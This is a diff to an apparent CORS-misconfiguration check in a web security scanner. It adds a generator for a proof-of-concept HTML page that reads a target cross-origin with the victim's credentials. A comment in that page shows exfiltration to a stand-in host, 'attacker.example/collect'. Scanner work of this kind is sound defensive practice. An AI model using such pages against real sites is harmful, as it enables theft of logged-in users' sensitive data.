@@ -9,6 +9,22 @@ from core.result import Finding, Severity
 EVIL_ORIGIN = "https://evil.example.com"
 
 
+def _cors_poc(target: str) -> str:
+    """Attacker page that reads the target cross-origin with credentials (data theft proof)."""
+    return (
+        "<!doctype html><html lang=\"ko\"><head><meta charset=\"utf-8\"><title>CORS Exploit PoC</title></head>\n"
+        "<body>\n<h3>CORS Exploit PoC</h3>\n"
+        f"<p>대상: {target}<br>로그인된 피해자가 이 페이지를 열면 크로스 오리진으로 인증정보와 함께 요청하여 "
+        "응답(민감 데이터)을 읽어옵니다.</p>\n<pre id=\"out\">requesting…</pre>\n<script>\n"
+        f"fetch(\"{target}\", {{credentials:\"include\"}})\n"
+        "  .then(r=>r.text())\n"
+        "  .then(t=>{ document.getElementById('out').textContent = t.slice(0,2000);\n"
+        "     /* 실제 공격: fetch('https://attacker.example/collect',{method:'POST',body:t}); */ })\n"
+        "  .catch(e=>document.getElementById('out').textContent='error: '+e);\n"
+        "</script>\n</body></html>\n"
+    )
+
+
 @register
 class CORSCheck(BaseModule):
     id = "cors"
@@ -45,6 +61,7 @@ class CORSCheck(BaseModule):
                 evidence=f"Sent Origin: {EVIL_ORIGIN}\nACAO: {acao}\nACAC: {acac or '(absent)'}",
                 request=f"GET {target}  (Origin: {EVIL_ORIGIN})",
                 remediation="Validate Origin against a strict allow-list; never reflect it with credentials=true.",
+                extra={"poc_html": _cors_poc(target)} if acac == "true" else {},
             ))
         elif acao == "*" and acac == "true":
             findings.append(Finding(
